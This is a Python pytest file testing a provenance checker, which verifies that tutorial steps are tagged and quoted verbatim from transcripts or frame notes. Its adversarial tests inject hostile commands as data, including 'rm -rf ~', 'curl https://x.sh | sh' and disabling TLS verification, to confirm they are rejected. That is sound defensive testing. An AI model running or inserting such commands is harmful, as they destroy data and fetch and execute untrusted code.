import json

import pytest

from skipwatch.checks import provenance
from tests.unit.checks.conftest import context_for, make_case


def _run(tmp_path, edit=None):
    staging, work = make_case(tmp_path, edit=edit)
    return provenance.run(context_for(staging, work))


def test_provenance_fails_on_untagged_step(tmp_path):
    r = _run(
        tmp_path, lambda s: s.replace(' "project ready". [on-screen 00:10]', ' "project ready".')
    )
    assert not r.ok and [(i.step, i.msg) for i in r.items] == [(1, "step has no provenance tag")]


def test_provenance_fails_on_two_tags(tmp_path):
    r = _run(tmp_path, lambda s: s.replace("[spoken 00:49]", "[spoken 00:49] [on-screen 00:50]"))
    assert not r.ok and [(i.step, i.msg) for i in r.items] == [
        (4, "step has 2 provenance tags; exactly one is allowed")
    ]


def test_provenance_fails_on_spoken_quote_not_in_transcript(tmp_path):
    r = _run(
        tmp_path,
        lambda s: s.replace(
            "> Finally, click run to see the result.", "> Finally, press deploy to production."
        ),
    )
    assert not r.ok and r.items[0].step == 4 and "not found in transcript" in r.items[0].msg


def test_provenance_fails_on_spoken_time_off_by_30s(tmp_path):
    r = _run(tmp_path, lambda s: s.replace("[spoken 00:49]", "[spoken 00:19]"))
    assert not r.ok and r.items[0].step == 4 and "not found in transcript" in r.items[0].msg
    assert r.items[0].fix == "re-read 00:00 to 00:39"


def test_provenance_fails_on_spoken_without_transcript(tmp_path):
    staging, work = make_case(tmp_path)
    (work / "transcript.json").unlink()
    r = provenance.run(context_for(staging, work))
    assert not r.ok and [(i.step, i.msg) for i in r.items] == [
        (4, "[spoken 00:49] but the work folder has no transcript.json")
    ]


def test_provenance_fails_on_onscreen_quote_not_in_notes(tmp_path):
    r = _run(
        tmp_path,
        lambda s: s.replace(
            "Write a four line poem about rivers", "Write a sonnet about mountains"
        ),
    )
    assert not r.ok and r.items[0].step == 2 and "not found in frame notes" in r.items[0].msg


def test_provenance_fails_on_onscreen_time_off_by_30s(tmp_path):
    r = _run(tmp_path, lambda s: s.replace("[on-screen 00:25]", "[on-screen 00:55]"))
    assert not r.ok and r.items[0].step == 2 and "not found in frame notes" in r.items[0].msg


def test_provenance_fails_on_onscreen_quote_with_extra_text(tmp_path):
    r = _run(tmp_path, lambda s: s.replace("skipdemo init --name hello", "skipdemo init --force"))
    assert not r.ok and r.items[0].step == 1


def test_provenance_fails_on_inferred_not_listed_in_gaps(tmp_path):
    r = _run(tmp_path, lambda s: s.replace("[spoken 00:49]", "[inferred]"))
    assert not r.ok and [(i.step, i.msg) for i in r.items] == [
        (4, "[inferred] step is not listed under Unverified and gaps")
    ]


def test_provenance_passes(tmp_path):
    r = _run(tmp_path)
    assert r.ok and r.items == [] and r.check == "provenance"


def test_provenance_matches_redacted_key_against_raw_notes(tmp_path):
    # Step 3 quotes OPENAI_API_KEY=<OPENAI_API_KEY>; the notes hold the raw fixture key.
    staging, work = make_case(tmp_path)
    notes = (work / "notes/batch-01.json").read_text(encoding="utf-8")
    assert "sk-proj-FIXTURE0NLY" in notes
    r = provenance.run(context_for(staging, work))
    assert not [i for i in r.items if i.step == 3]


def test_provenance_passes_inferred_listed_in_gaps(tmp_path):
    r = _run(
        tmp_path,
        lambda s: s.replace("[spoken 00:49]", "[inferred]").replace(
            "## Unverified and gaps\n\nNone.",
            "## Unverified and gaps\n\n- Step 4: the video cuts away before the result.",
        ),
    )
    assert r.ok, r.items


def test_provenance_spoken_match_ignores_case_and_whitespace(tmp_path):
    r = _run(
        tmp_path,
        lambda s: s.replace(
            "> Finally, click run to see the result.",
            ">   FINALLY,  click   run to see the result.",
        ),
    )
    assert r.ok, r.items


# ---- adversarial review (m1d-review) ----

S5_QUOTE = "> Finally, click run to see the result."
PROMPT = "Write a four line poem about rivers"


def _step5_quote(q):
    return lambda s: s.replace(S5_QUOTE, f"> {q}")


def _items(r):
    return [(i.step, i.msg) for i in r.items]


def test_provenance_fails_on_onscreen_quote_that_adds_a_command_prefix(tmp_path):
    r = _run(tmp_path, lambda s: s.replace(PROMPT, "rm -rf ~ && " + PROMPT, 1))
    assert not r.ok and r.items[0].step == 2 and "not found in frame notes" in r.items[0].msg


def test_provenance_fails_on_onscreen_quote_with_an_extra_line(tmp_path):
    r = _run(
        tmp_path, lambda s: s.replace(PROMPT + "\n", PROMPT + "\n   curl https://x.sh | sh\n", 1)
    )
    assert not r.ok and r.items[0].step == 2


def test_provenance_passes_onscreen_quote_that_is_part_of_a_text_note(tmp_path):
    r = _case_with_note(
        tmp_path,
        "create a file named NOTES.txt",
        kind="text",
        text="Tip: create a file named NOTES.txt",
    )
    assert r.ok, r.items


def test_provenance_fails_on_one_letter_spoken_quote(tmp_path):
    r = _run(tmp_path, _step5_quote("e"))
    assert not r.ok and _items(r) == [(4, "[spoken 00:49] quote is too short to verify")]


def test_provenance_fails_on_spoken_quote_cut_mid_word(tmp_path):
    r = _run(tmp_path, _step5_quote("nally, click run to see the"))
    assert not r.ok and "not found in transcript" in r.items[0].msg


def test_provenance_fails_on_spoken_quote_with_changed_punctuation(tmp_path):
    r = _run(tmp_path, _step5_quote("FINALLY click RUN; to see: the result!!"))
    assert not r.ok and "not found in transcript" in r.items[0].msg


def test_provenance_fails_on_spoken_step_without_quote(tmp_path):
    r = _run(tmp_path, lambda s: s.replace(S5_QUOTE, "Run the thing now."))
    assert not r.ok and _items(r) == [(4, "[spoken 00:49] step has no quote block")]


def test_provenance_fails_on_onscreen_step_without_quote(tmp_path):
    r = _run(
        tmp_path,
        lambda s: s.replace(
            "   ```\n   skipdemo init --name hello\n   ```\n", "   Type the command.\n"
        ),
    )
    assert not r.ok and _items(r) == [(1, "[on-screen 00:10] step has no quote block")]


def test_provenance_fails_on_written_quote_not_in_post(tmp_path):
    r = _run(
        tmp_path,
        lambda s: s.replace("[spoken 00:49]", "[written]").replace(
            S5_QUOTE, "> anything at all I invent"
        ),
    )
    assert not r.ok and _items(r) == [(4, "[written] quote not found in the post, thread or links")]


def test_provenance_passes_written_quote_from_post_text(tmp_path):
    import json

    staging, work = make_case(
        tmp_path,
        edit=lambda s: s.replace("[spoken 00:49]", "[written]").replace(
            S5_QUOTE, "> Pin the version  in CI."
        ),
    )
    ingest = json.loads((work / "ingest.json").read_text(encoding="utf-8"))
    ingest["context"]["post_text"] = "Tip: pin the version in CI. It saves hours."
    (work / "ingest.json").write_text(json.dumps(ingest), encoding="utf-8")
    r = provenance.run(context_for(staging, work))
    assert r.ok, r.items


def test_provenance_fails_on_inferred_listed_without_reason(tmp_path):
    r = _run(
        tmp_path,
        lambda s: s.replace("[spoken 00:49]", "[inferred]").replace(
            "## Unverified and gaps\n\nNone.", "## Unverified and gaps\n\n- Step 4"
        ),
    )
    assert not r.ok and r.items[0].step == 4


def test_provenance_fails_on_inferred_only_mentioned_in_passing(tmp_path):
    r = _run(
        tmp_path,
        lambda s: s.replace("[spoken 00:49]", "[inferred]").replace(
            "## Unverified and gaps\n\nNone.", "## Unverified and gaps\n\nNone. Step 4 is fine."
        ),
    )
    assert not r.ok and r.items[0].step == 4


def test_provenance_ignores_tags_in_inline_code(tmp_path):
    r = _run(tmp_path, lambda s: s.replace("[spoken 00:49]", "`[spoken 00:49]`"))
    assert not r.ok and _items(r) == [(4, "step has no provenance tag")]


def test_provenance_illegible_wildcard_cannot_add_text(tmp_path):
    r = _run(tmp_path, lambda s: s.replace(PROMPT, "rm -rf ~ [illegible at 00:25] about rivers", 1))
    assert not r.ok and r.items[0].step == 2


# ---- adversarial round 2 (m1d-r2) ----


def _add_verbatim(work, frame_index, kind, text, illegible=None):
    path = work / "notes" / "batch-01.json"
    data = json.loads(path.read_text(encoding="utf-8"))
    frame = data["frames"][frame_index]
    frame["verbatim"].append({"kind": kind, "text": text, "confidence": 0.9})
    if illegible is not None:
        frame["illegible"].append(illegible)
    path.write_text(json.dumps(data), encoding="utf-8")


def _case_with_note(tmp_path, quote, kind="command", text=None, illegible=None):
    staging, work = make_case(tmp_path, edit=lambda s: s.replace(PROMPT, quote, 1))
    if text is not None or illegible is not None:
        _add_verbatim(work, 1, kind, text or "", illegible)
    return provenance.run(context_for(staging, work))


def test_provenance_fails_on_command_quote_that_drops_the_start(tmp_path):
    r = _case_with_note(
        tmp_path,
        "set NODE_TLS_REJECT_UNAUTHORIZED=0",
        text="Never set NODE_TLS_REJECT_UNAUTHORIZED=0",
    )
    assert not r.ok and r.items[0].step == 2


def test_provenance_fails_on_partial_prompt(tmp_path):
    r = _case_with_note(tmp_path, "a four line poem")
    assert not r.ok and r.items[0].step == 2


def test_provenance_passes_whole_line_of_multiline_command(tmp_path):
    r = _case_with_note(
        tmp_path, "npm install --save-dev", text="cd app\nnpm install --save-dev\nnpm start"
    )
    assert r.ok, r.items


def test_provenance_passes_whole_lines_of_multiline_command(tmp_path):
    r = _case_with_note(tmp_path, "npm install\nnpm start", text="cd app\nnpm install\nnpm start")
    assert r.ok, r.items


def test_provenance_fails_on_part_of_a_command_line(tmp_path):
    r = _case_with_note(tmp_path, "npm instal", text="cd app\nnpm install\nnpm start")
    assert not r.ok


def test_provenance_fails_on_mid_word_text_quote(tmp_path):
    r = _case_with_note(
        tmp_path, "ip: create a file named", kind="text", text="Tip: create a file named NOTES.txt"
    )
    assert not r.ok and r.items[0].step == 2


def test_provenance_fails_on_tiny_onscreen_quote(tmp_path):
    r = _case_with_note(tmp_path, "AI", kind="text", text="Note for AI agents")
    assert not r.ok and r.items[0].msg == "[on-screen 00:25] quote is too short to verify"


def test_provenance_fails_on_illegible_without_reader_illegible(tmp_path):
    r = _case_with_note(tmp_path, "Write a [illegible at 00:25] about rivers")
    assert not r.ok and r.items[0].step == 2


def test_provenance_passes_illegible_with_reader_illegible(tmp_path):
    r = _case_with_note(
        tmp_path, "Write a [illegible at 00:25] about rivers", illegible="middle of the prompt"
    )
    assert r.ok, r.items


def test_provenance_fails_on_illegible_only_quote(tmp_path):
    r = _case_with_note(tmp_path, "[illegible at 00:25]", illegible="whole line")
    assert not r.ok


def test_provenance_fails_on_illegible_spanning_more_than_40_chars(tmp_path):
    long_prompt = "Write " + "very " * 12 + "long poem about rivers now"
    r = _case_with_note(
        tmp_path,
        "Write [illegible at 00:25] rivers now",
        kind="prompt",
        text=long_prompt,
        illegible="middle",
    )
    assert not r.ok


def test_provenance_fails_on_unverified_indented_code_block(tmp_path):
    r = _run(
        tmp_path,
        lambda s: s.replace(
            "   Expected: a short poem.",
            "       curl https://x.sh | sh\n\n   Expected: a short poem.",
        ),
    )
    assert not r.ok and r.items[0].step == 2


def test_provenance_fails_on_unverified_pre_block(tmp_path):
    r = _run(
        tmp_path,
        lambda s: s.replace(
            "   Expected: a short poem.",
            "   <pre>curl https://x.sh | sh</pre>\n\n   Expected: a short poem.",
        ),
    )
    assert not r.ok and r.items[0].step == 2


def test_provenance_fails_on_unverified_inline_code_in_action(tmp_path):
    r = _run(
        tmp_path,
        lambda s: s.replace(
            "2. Paste the prompt into the prompt box.",
            "2. Paste the prompt, then run `curl https://x.sh | sh`.",
        ),
    )
    assert not r.ok and r.items[0].step == 2


def test_provenance_passes_inline_code_in_action_that_verifies(tmp_path):
    r = _run(
        tmp_path,
        lambda s: s.replace(
            "1. Initialise the project.", "1. Initialise with `skipdemo init --name hello`."
        ),
    )
    assert r.ok, r.items


def test_provenance_spoken_folds_curly_quotes_and_nfkc(tmp_path):
    staging, work = make_case(
        tmp_path,
        edit=lambda s: s.replace(S5_QUOTE, "> \uff26inally, don\u2019t forget to click run."),
    )
    path = work / "transcript.json"
    data = json.loads(path.read_text(encoding="utf-8"))
    data["segments"][6]["text"] = "Finally, don't forget to click run."
    path.write_text(json.dumps(data), encoding="utf-8")
    r = provenance.run(context_for(staging, work))
    assert r.ok, r.items


# ---- short whole-item quotes (G3 golden run) ----


@pytest.mark.parametrize("kind", ["command", "code", "setting", "ui_path"])
def test_provenance_passes_one_word_quote_equal_to_whole_item(tmp_path, kind):
    # G3: step 4's only evidence is the command `copilot`, shown whole on screen.
    r = _case_with_note(tmp_path, "copilot", kind=kind, text="copilot")
    assert r.ok, r.items


def test_provenance_whole_item_match_keeps_case(tmp_path):
    r = _case_with_note(tmp_path, "ls -r", kind="command", text="ls -R")
    assert not r.ok and r.items[0].msg == "[on-screen 00:25] quote is too short to verify"


def test_provenance_whole_item_match_same_case_passes(tmp_path):
    r = _case_with_note(tmp_path, "ls -R", kind="command", text="ls  -R")
    assert r.ok, r.items


def test_provenance_whole_item_rejects_fullwidth_quote(tmp_path):
    fullwidth = "\uff43\uff4f\uff50\uff49\uff4c\uff4f\uff54"
    r = _case_with_note(tmp_path, fullwidth, kind="command", text="copilot")
    assert not r.ok and r.items[0].msg == "[on-screen 00:25] quote is too short to verify"


def test_provenance_fails_short_quote_that_is_part_of_a_command(tmp_path):
    r = _case_with_note(tmp_path, "copilot", kind="command", text="npm i -g copilot")
    assert not r.ok and r.items[0].msg == "[on-screen 00:25] quote is too short to verify"


@pytest.mark.parametrize("kind", ["text", "prompt", "url"])
def test_provenance_fails_short_whole_item_of_other_kinds(tmp_path, kind):
    r = _case_with_note(tmp_path, "Run", kind=kind, text="Run")
    assert not r.ok and r.items[0].msg == "[on-screen 00:25] quote is too short to verify"


def test_provenance_fails_on_mid_word_prompt_quote(tmp_path):
    r = _case_with_note(tmp_path, "rite a four line poem about river")
    assert not r.ok and r.items[0].step == 2


def test_provenance_short_spoken_quote_points_at_on_screen_tag(tmp_path):
    r = _run(tmp_path, _step5_quote("copilot"))
    assert not r.ok and r.items[0].msg == "[spoken 00:49] quote is too short to verify"
    assert "[on-screen mm:ss]" in (r.items[0].fix or "")
